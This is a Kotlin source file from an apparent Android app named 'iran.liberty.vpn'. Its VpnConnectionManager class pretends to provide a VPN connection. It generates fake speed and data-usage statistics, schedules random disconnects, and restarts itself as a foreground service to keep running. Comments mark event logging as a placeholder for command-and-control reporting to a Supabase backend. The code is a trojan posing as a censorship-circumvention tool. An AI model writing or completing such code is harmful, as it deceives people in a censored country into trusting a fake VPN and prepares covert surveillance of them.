package com.iran.liberty.vpn

import android.content.Context
import android.content.Intent
import android.os.Build
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit
import kotlin.random.Random

/**
 * Manages fake VPN connection state and automatic behaviors.
 */
class VpnConnectionManager(private val context: Context) {
    
    private val scope = CoroutineScope(Dispatchers.IO)
    private var disconnectJob: Job? = null
    private var statsUpdateJob: Job? = null
    
    // Fake connection state
    var isConnected = false
    var connectedSince = 0L
    var fakeDataUsed = 0L
    var fakeUploadSpeed = 0.0
    var fakeDownloadSpeed = 0.0
    var currentServer = "Netherlands - Secure"
    
    /**
     * Starts the fake VPN connection.
     */
    fun startFakeConnection() {
        if (isConnected) return
        
        isConnected = true
        connectedSince = System.currentTimeMillis()
        fakeDataUsed = 0L
        
        // Start fake stats updates
        startFakeStatsUpdates()
        
        // Schedule random disconnect
        scheduleRandomDisconnect()
        
        // Log connection start (would go to C2 in real implementation)
        logEvent("VPN_CONNECTED", mapOf("server" to currentServer))
    }
    
    /**
     * Stops the fake VPN connection.
     */
    fun stopFakeConnection() {
        if (!isConnected) return
        
        isConnected = false
        
        // Stop scheduled jobs
        disconnectJob?.cancel()
        disconnectJob = null
        stopFakeStatsUpdates()
        
        // Log disconnection
        logEvent("VPN_DISCONNECTED", null)
    }
    
    /**
     * Schedules a random disconnect between 4-12 hours.
     */
    private fun scheduleRandomDisconnect() {
        disconnectJob?.cancel()
        
        val disconnectDelay = Random.nextLong(
            TimeUnit.HOURS.toMillis(Constants.MIN_DISCONNECT_INTERVAL_HOURS),
            TimeUnit.HOURS.toMillis(Constants.MAX_DISCONNECT_INTERVAL_HOURS)
        )
        
        disconnectJob = scope.launch {
            delay(disconnectDelay)
            
            // Simulate random disconnect
            simulateDisconnectEvent()
            
            // Stop the connection
            stopFakeConnection()
            
            // Restart service to maintain foreground state
            restartService()
        }
        
        logEvent("DISCONNECT_SCHEDULED", mapOf(
            "delay_hours" to TimeUnit.MILLISECONDS.toHours(disconnectDelay)
        ))
    }
    
    /**
     * Starts periodic fake stats updates.
     */
    private fun startFakeStatsUpdates() {
        statsUpdateJob?.cancel()
        
        statsUpdateJob = scope.launch {
            while (isConnected) {
                updateFakeStats()
                delay(Constants.STATS_UPDATE_INTERVAL_MS)
            }
        }
    }
    
    /**
     * Stops fake stats updates.
     */
    private fun stopFakeStatsUpdates() {
        statsUpdateJob?.cancel()
        statsUpdateJob = null
    }
    
    /**
     * Updates fake VPN statistics.
     */
    private fun updateFakeStats() {
        // Generate realistic-looking fake stats
        fakeUploadSpeed = Random.nextDouble(0.5, 5.0)
        fakeDownloadSpeed = Random.nextDouble(2.0, 12.0)
        
        // Increment fake data usage
        val increment = Random.nextLong(10000, 100000) // 10KB - 100KB per update
        fakeDataUsed += increment
    }
    
    /**
     * Simulates a disconnect event with notification.
     */
    private fun simulateDisconnectEvent() {
        // This would trigger a notification in the real implementation
        // For now, just log it
        logEvent("RANDOM_DISCONNECT_SIMULATED", null)
    }
    
    /**
     * Restarts the VPN service.
     */
    private fun restartService() {
        val intent = Intent(context, FakeVpnService::class.java).apply {
            action = FakeVpnService.Actions.ACTION_CONNECT
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
    }
    
    /**
     * Logs events (placeholder for C2 integration).
     */
    private fun logEvent(event: String, data: Map<String, Any>?) {
        // In real implementation, this would send to Supabase
        // For Pathway 3, we just create the structure
    }
    
    /**
     * Gets connection duration in minutes.
     */
    fun getConnectionDurationMinutes(): Long {
        return if (isConnected && connectedSince > 0) {
            TimeUnit.MILLISECONDS.toMinutes(System.currentTimeMillis() - connectedSince)
        } else {
            0
        }
    }
    
    /**
     * Formats data usage for display.
     */
    fun getFormattedDataUsed(): String {
        return when {
            fakeDataUsed >= 1024 * 1024 * 1024 -> 
                String.format("%.2f GB", fakeDataUsed / (1024.0 * 1024.0 * 1024.0))
            fakeDataUsed >= 1024 * 1024 -> 
                String.format("%.2f MB", fakeDataUsed / (1024.0 * 1024.0))
            fakeDataUsed >= 1024 -> 
                String.format("%.2f KB", fakeDataUsed / 1024.0)
            else -> "$fakeDataUsed B"
        }
    }
    
    /**
     * Cleans up resources.
     */
    fun cleanup() {
        disconnectJob?.cancel()
        statsUpdateJob?.cancel()
        isConnected = false
    }
}